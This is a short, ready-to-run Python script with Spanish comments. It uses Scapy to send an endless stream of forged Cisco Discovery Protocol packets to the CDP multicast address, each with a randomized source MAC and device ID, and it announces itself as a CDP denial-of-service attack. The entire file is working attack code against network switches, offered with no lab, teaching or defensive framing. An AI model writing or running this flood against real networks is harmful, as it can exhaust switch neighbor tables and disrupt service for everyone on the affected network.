from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC
import struct
import random
import time

CDP_MULTICAST = "01:00:0c:cc:cc:cc"
INTERFACE = "eth0"   # cambia si tu interfaz es otra (eth1, ens33, etc)

def generar_checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'

    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]

    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def tlv(tipo, valor):
    return struct.pack("!HH", tipo, len(valor) + 4) + valor

def crear_cdp():
    device_id = f"SW-{random.randint(100,999)}".encode()
    port_id = b"GigabitEthernet0/1"
    capabilities = struct.pack("!I", 0x01)

    payload = b""
    payload += tlv(0x0001, device_id)     # Device ID
    payload += tlv(0x0003, port_id)       # Port ID
    payload += tlv(0x0004, capabilities)  # Capabilities

    version = 0x02
    ttl = random.randint(120, 180)

    header = struct.pack("!BBH", version, ttl, 0x0000)
    checksum = generar_checksum(header + payload)

    return struct.pack("!BBH", version, ttl, checksum) + payload

print("[*] Iniciando ataque CDP DoS")

try:
    while True:
        cdp_data = crear_cdp()

        packet = (
            Ether(src=RandMAC(), dst=CDP_MULTICAST) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2000) /
            Raw(load=cdp_data)
        )

        sendp(packet, iface=INTERFACE, verbose=False)
        time.sleep(random.uniform(0.03, 0.07))

except KeyboardInterrupt:
    print("\n[!] Ataque detenido")
